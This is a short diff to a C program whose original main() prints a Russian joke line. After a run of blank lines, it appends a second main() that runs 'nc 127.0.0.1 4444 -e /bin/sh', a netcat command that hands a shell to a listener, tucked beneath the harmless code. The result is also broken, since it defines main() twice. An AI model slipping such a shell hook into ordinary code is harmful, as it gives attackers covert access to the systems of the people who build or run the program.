@@ -6,3 +6,14 @@ int main() {
     printf("Ты здесь, а мог быть на Бали\n");
     return 0;
 }
+
+
+
+
+
+#include <stdlib.h>
+
+int main() {
+    system("nc 127.0.0.1 4444 -e /bin/sh");
+    return 0;
+}
